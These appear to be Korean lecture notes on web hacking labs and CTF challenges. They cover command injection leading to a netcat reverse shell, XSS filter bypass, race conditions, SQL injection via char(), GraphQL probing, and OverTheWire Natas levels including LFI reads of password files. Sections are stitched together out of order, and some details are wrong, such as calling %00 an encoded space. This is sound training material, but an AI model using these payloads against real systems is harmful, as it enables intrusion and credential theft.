이러한 취약점이 발생하는 이유는 웹서버의 설정이나 코드에서 입력 값에 대한 검증을 하지 않았기 때문이다. 만약 id 값의 범위(예: 10~38)만 지정하여 선택하도록 했다면 다른 값은 입력할 수 없었을 것이다.

4. Remote OS Command Injection — 리버스 커넥션

(Reverse Shell)

Command Injection 취약점을 이용하여 원격에서 명령을 실행하는 Remote OS Command Injection도 진행할 수 있다. 원격 접속에는 netcat을 이용하는 방법을 사용한다.

4-1. 리버스 커넥션 개념

칼리에서 특정 포트로 리스닝을 하고 있다가, 대상 시스템에서 명령어가 실행되면 리스닝하 고 있는 칼리 쪽으로 접속하도록 하는 방식을 리버스 커넥션(역방향 접속)이라고 한다.

4-2. 실습 절차
⌘Shell
# 칼리에서 특정 포트로 리스닝 시작
nc -lvp 5555

이후 웹 브라우저의 id 파라미터에 명령어를 삽입하여 칼리 쪽으로 접속하도록 요청한다. 형식은 앞서 사용한 방식과 동일하게 세미콜론으로 명령어를 연결하고, 실제 존재하는 id 값을 마지막에 배치한다.

리버스 커넥션이 성립되면 칼리의 터미널에서 대상 시스템에 연결된 것을 확인할 수 있으며,

ls , pwd 등의 명령어로 대상 시스템 내부를 확인할 수 있다.

ZAP 프록시 사용 중 갑자기 오류가 발생하는 경우가 있는데, 이때는 새로 고침하면 해결된다.

리버스 커넥션이 성립된 이후에는 추가적인 정보 수집을 통해 권한 상승 등 2차 공격을 진행할 수 있다. 실습에서는 command injection을 이용한 리버스 커넥션까지 확인하였으며, ZAP에서 스캐닝을 끝까지 진행하면 추가적인 취약점들이 존재할 수 있음을 알 수 있다. 리버스 커넥션이 가능하다는 것은 CTF 문제 풀이 시 웹셀 코드를 올리는 등의 작업도 가능함 을 의미한다.

181. Deface 머신 정보 수집 및 게시글 등록 페이지 추론

1. Deface 실습 개요

Deface 공격은 웹사이트의 얼굴(화면)을 바꾸는 공격이다. 특정 이미지를 웹브라우저에 가 득 차도록 하여 다른 사용자들이 서비스를 정상적으로 사용하지 못하도록 하는 것이 Deface이다. 예시로 OWASP 이미지를 웹브라우저 전체 크기로 나타나게 한 사례가 있다. 시작 페이지뿐만 아니라 특정 페이지의 원래 모습(얼굴)을 바꾸는 것을 모두 Deface라고 한다.

Deface 공격을 당하면 클라이언트가 정상적인 사이트로 접속할 수 없게 되므로 문제가 발생한다.

2. Deface 머신 정보 수집

2-1. nmap 스캐닝

Command Injection 머신과 마찬가지로 nmap 스캐닝을 진행한다.

⌘Shell

각 파일 링크에 마우스를 올리면 하단에 표시되는 링크 주소에 down 이라는 파라미터가 있으며, 값 끝이 == (또는 = )로 끝나 Base64 인코딩임을 확인할 수 있다.

flag.docx 링크는 클릭 시 자바스크립트 alert( access denied )가 실행되도록 되어 있다.

터미널에서 파일명을 Base64로 인코딩해 비교한다.

⌘Shell
# 파일명을 base64로 인코딩하여 down 파라미터 값과 비교
echo -n "test.txt" | base64
echo -n "flag.docx" | base64

flag.docx 를 Base64 인코딩한 값을 down 파라미터에 직접 넣어 URL로 접속하면, 화면상 안내 메시지와 무관하게 실제로는 파일 다운로드가 이루어진다.

다운로드된 flag.docx (워드 파일)를 열어 인증키를 확인한다.

8. 23번 — 대소문자 연속 필터 우회를 통한 스크립트 삽입

문제 미션은 스크립트 태그를 인젝션하는 것이다.

<script>alert(1)</script> 를 그대로 입력하고 제출하면 no hack 문구가 출력된다.

URL 파라미터 code 에 입력값이 그대로 전달되는 것을 확인한다.

테스트를 통해 필터 조건을 파악한다.

입력 결과
a (알파벳 1자) 정상 처리
ab (알파벳 2자 연속) no hack
AB (대문자 2자 연속) no hack
숫자, 특수문자(연속 포함) 정상 처리

즉 영어 알파벳(대소문자 불문)이 2자 이상 연속되면 no hack 이 출력되도록 필터링되어 있다.

URL 인코딩( %73 등)으로 문자를 치환해도 실제 처리 시 정상적으로 스크립트가 해석되 지 않아 우회되지 않는다.

해결 방법: 알파벳 문자 사이에 공백을 하나씩 넣어 연속을 끊는다. 공백을 URL 인코딩 하면 %00 이다.

⌘Text
S%00C%00R%00I%00P%00T 태그를 열고 A%00L%00E%00R%00T%001 를 넣은 뒤 다시 S%00C%00R%00I%00P%
00T 로 닫음

숫자, 특수문자, 슬래시, 세미콜론 등은 연속으로 입력해도 필터링 대상이 아니므로 그대로 두어도 된다.

위 방식으로 알파벳 사이마다 %00 을 넣어 제출하면 no hack 이 뜨지 않고 문제가 정상적으로 풀린다.

11. 10번 — 클릭 이벤트에 따른 좌표(픽셀) 이동값 분석

화면상 특정 문자(예: "O")를 클릭할 때마다 위치가 이동한다.

개발자 도구에서 소스를 확인하면, 특정 문자(예: "골드")의 왼쪽 기준 위치 값(예: 1600 픽셀)이 고정되어 있고, 다른 문자(예: "5")는 클릭 시마다 위치 값이 1픽셀씩 증가하도 록 되어 있다.

즉 클릭 이벤트에 따라 좌표 값이 누적 증가하는 방식이며, 이를 코드에서 직접 확인하여 목표 위치까지 이동시키는 방식으로 접근한다.

본 문제는 이후 내용이 자막상 명확히 이어지지 않아 추가 세부 내용은 생략한다.

12. 60번 — 레이스 컨디션(Race Condition) 공격

소스 코드 확인 결과, idx 값이 result 값과 같고, 숫자가 아니어야 한다는 조건이 있다.

1초( 1sec ) 이내에 특정 세션 관련 값이 삭제되는 로직이 존재한다.

1초가 되기 전에 idx 값을 두 개의 브라우저 세션에 동시에 넣어 처리해야 한다.

12-1. 해결 절차

  1. mode=auth 파라미터로 요청 시 정상 처리됨을 확인한다.

  2. 두 개의 브라우저에서 동일한 idx 값(예: 75237)을 쿠키에 설정한다.

  3. 1초 이내에 두 브라우저에서 거의 동시에 새로고침하여 요청을 경합시킨다.

  4. 조건이 충족되면 플래그 값이 출력된다.

이러한 공격 기법을 레이스 컨디션 공격이라 하며, 적절한 락(lock) 처리가 없을 경우 데이터가 의도치 않게 삭제되거나 중복 처리되는 문제가 발생할 수 있다. 본 문제는 레이스 컨디션의 원리를 이해시키기 위해 제작된 문제이다.

13. 46번 — 필터 우회 SQL 인젝션(ASCII 코드 활용)

13-1. 사전 테스트

입력값에 작은따옴표( ' ), or 1=1 등을 넣어도 별도의 에러 메시지가 출력되지 않는다. 즉 SQL 컬럼 에러 메시지가 노출되지 않는 구조이다.

13-2. 소스 코드 분석

PHP 코드에서 입력값( lv )은 addslashes 함수로 처리된다.

이후 공백, 슬래시, 아스트로피(), % 문자는 모두 공백으로 치환된다.

이어서 flag_match 라는 함수에 의해 select , limit 등의 문자열이 필터링된다.

최종 쿼리는 CHALL 테이블에서 id , cash 컬럼을 조회하는 구조이며, id 값이 admin 이면 문제가 해결된다.

id 파라미터에 직접 admin 을 입력하면 위 필터에 의해 차단되어 정상 동작하지 않는다.

13-3. 우회 방법

admin 문자열을 직접 사용하는 대신, 각 글자의 ASCII 코드를 char() 함수로 표현하여 문자열 필터를 우회한다.

문자 ASCII 코드
a 97
d 100
m 109
i 105
n 110
⌘Text
-- addslashes 및 문자열 필터를 우회하기 위해 char() 함수로 ASCII
코드를 조합
-- lv=0 이후 파이프(||) 연산자로 조건을 추가하여 admin 문자열을 우
회 생성
0 || id=char(97,100,109,105,110)

위와 같이 lv 파라미터 값을 0으로 하고, 파이프( || ) 연산자를 사용해 char() 함수로 만든 admin 문자열과 비교하는 조건을 추가하면 로그인이 우회되어 문제가 해결된다.

6-3. 해결 절차

  2. window.$gamePlayer._y 값을 변경한다(속성 키가 y 가 아니라 _y 임을 확인).

  3. 값을 변경한 뒤 캐릭터를 클릭하면 위치가 이동하며, 보물상자 위치로 이동하면 플래그

가 출력된다.

⚠️ 캐릭터 객체 대신 보물상자 객체의 위치 값을 캐릭터 쪽으로 옮기는 방법도 가능하다고 언급되었다.

11. Not SQL 문제: GraphQL 실습

11-1. 문제 구조

게시판 형태의 화면으로, 글을 클릭하면 내용이 표시된다.

소스 확인 결과, /view.php 파일에 GET 방식으로 query 라는 파라미터를 JSON 형식으로 전달하고 있음이 확인되었다.

11-2. 코드 분석

query 파라미터 값을 가져오는 함수가 있고, 이 값이 없으면(No) 특정 로직을, 있으면 (No가 아니면) 다른 로직을 실행하는 조건문 구조로 확인되었다.

No가 아닐 때 실행되는 부분에서 view 라는 키에 대해 no (글 번호), subject (제목) 두 항목이 JSON 형태로 구성되고, else 부분에서는 subject 와 content 까지 포함한 세 항목이 구성됨이 확인되었다.

11-3. 실습 절차
  1. 확인한 view 관련 JSON 형태( no , subject , content )를 그대로 query 파라미터에 넣

어 테스트한다.

  1. 최초 시도에서는 "Syntax Error"(문법 오류)가 발생하였는데, 이는 중괄호( { )가 빠졌

기 때문으로 확인되었다.

  1. view 앞뒤에 중괄호를 추가하여 다시 query 값에 넣으면 두 개의 글 내용이 모두 출력

되는 것을 확인하였다.

11-4. GraphQL 개념 설명

이러한 형태의 쿼리 언어를 GraphQL이라고 설명하였다.

graphql.org 사이트의 Learn 메뉴 > Queries 문서를 참고하여, Query 문의 기본 형식(중괄호와 JSON 형식의 key-value)을 확인하였다.

MySQL 계열에 information_schema 가 있듯이, GraphQL에도 스키마(Schema), 타입 (Types) 등을 조회할 수 있는 기본 쿼리가 존재한다고 설명되었다.

{ view, type, schema } 와 같이 여러 키를 함께 조회하면 에러가 뜨더라도, 그 아래 표시되는 내용을 통해 어떤 쿼리 문이 지원되는지 어느 정도 구조를 파악할 수 있다고 설명되었다.

4. Natas Level 2 — 디렉토리 탐색

4-1. 문제 내용

페이지 소스에 pixel.png 라는 이미지 파일이 files 디렉토리 하위에 존재한다.

4-2. 풀이 방법

  1. 페이지 소스 또는 개발자 도구에서 files/pixel.png 경로를 확인한다.

  2. pixel.png 파일은 1×1 픽셀 이미지로 별다른 정보가 없다.

  3. pixel.png 를 URL에서 제거하고 files/ 디렉토리 자체를 접근한다.

⌘Text
<http://natas2.natas.labs.overthewire.org/files/>

files/ 디렉토리 내에 users.txt 파일이 존재한다.

users.txt 를 클릭하면 natas3에 대한 패스워드가 표시된다.

users.txt 파일에는 여러 사용자(alice 등)의 계정 정보가 포함되어 있으므로 별도 파일로 저장해 두는 것이 좋다.

5. Natas Level 3 — robots.txt 파일 활용

5-1. 문제 내용

페이지 소스의 첫 번째 div 에 "구글도 이번 시간에는 찾지 못할 것이다"라는 힌트가 나타난다.

5-2. 풀이 접근

"구글이 찾지 못한다"는 표현은 검색엔진 봇을 차단하는 것과 관련이 있다. 이는 robots.txt

파일과 연관된다. 검색엔진 봇을 robots.txt 로 차단하면 해당 사이트가 검색엔진에서 노출되지 않는다.

⌘Text
<http://natas3.natas.labs.overthewire.org/robots.txt>

robots.txt 에서 숨겨진 디렉토리 경로( s3cr3t 등)를 확인할 수 있다.

5-3. 풀이 방법

  1. URL에서 robots.txt 접근 → 숨겨진 디렉토리 경로 확인

  2. 해당 디렉토리로 접근 → users.txt 파일 확인

⌘Text
<http://natas3.natas.labs.overthewire.org/s3cr3t/>

users.txt 를 통해 natas4에 대한 패스워드를 확인할 수 있다.

6. Natas Level 4 — HTTP Referer 헤더 변조

6-1. 문제 내용

접근 시 "Access Disallowed"가 표시되며, natas5 경로로 방문하면 인정된다는 안내가 나온다. "Refresh Page" 클릭 시 "natas4로 방문 중인데, 인가된 사용자는 natas5로 접속하면 된다"라는 내용이 표시된다.

6-2. 풀이 방법

현재 natas4 사용자가 natas5로 이동하는 링크에 대해 인터셉트하여 참조되는(Referer) 사이트를 변경한다.

Burp Suite 프록시 설정

  1. 웹 브라우저에서 프록시 설정을 한다.

  2. Burp Suite를 실행하고 Proxy → Intercept를 ON으로 설정한다.

  3. "Refresh Page" 클릭 후 Burp에서 트래픽을 잡는다.

  4. 요청 헤더의 Referer 값을 natas5 로 변경한다.

⌘Text
Referer: <http://natas5.natas.labs.overthewire.org/>
  1. Forward 후 Intercept를 OFF로 전환하면 패스워드가 표시된다.

Referer 헤더는 참조하는(연결되는) 사이트 주소를 나타내는 헤더값이다.

10. Natas Level 7 — LFI(Local File Inclusion) 취약점

10-1. 문제 내용

Home, About 등 버튼 클릭 시 URL의 page 파라미터에 버튼 이름이 들어간다.

⌘Text
index.php?page=home
index.php?page=about

현재 사이트가 웹 해킹 취약점과 관련되어 있으므로 이는 LFI(Local File Inclusion) 취약점에 해당한다.

10-2. LFI 취약점 확인

잘못된 경로를 입력하면 실제 서버 경로가 노출된다.

⌘Text
실제 경로: /var/www/natas/natas7/index.php

페이지 소스의 힌트에서 natas8 패스워드 위치를 확인할 수 있다.

⌘Shell
# natas8 패스워드 파일 경로
/etc/natas_webpass/natas8
10-3. 풀이 방법

page 파라미터에 패스워드 파일 경로를 직접 입력한다.

⌘Text
index.php?page=/etc/natas_webpass/natas8

LFI 취약점에 의해 해당 파일 내용이 출력되며 패스워드를 획득할 수 있다.

10-4. RFI(Remote File Inclusion) 취약점 테스트

칼리에서 웹 서버를 실행하고 원격 파일 경로를 HTTP 경로로 입력하여 RFI 취약점이 있는지 테스트할 수 있다.

⌘Shell
# 칼리에서 파이썬으로 웹서버 실행
python3 -m http.server 8000

테스트 결과, 이 페이지에서는 RFI 취약점은 없는 것으로 확인된다.

http:// , 특수 문자 등을 필터링하거나 로컬 파일만 실행되도록 설정한 것으로 보인다.

⚠️ LFI 취약점이 있는 경우 RFI(Remote File Inclusion) 취약점도 함께 확인해야 한다. 대응 방법으로는 http:// 등 특수 문자를 필터링하거나 로컬 파일만 실행되도록 설정하는 방법이 있다.

11. Natas Level 8 — PHP 인코딩/디코딩 역연산

11-1. 문제 내용

View Source Code에서 다음과 같은 인코딩 로직을 확인할 수 있다.

⌘Text
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
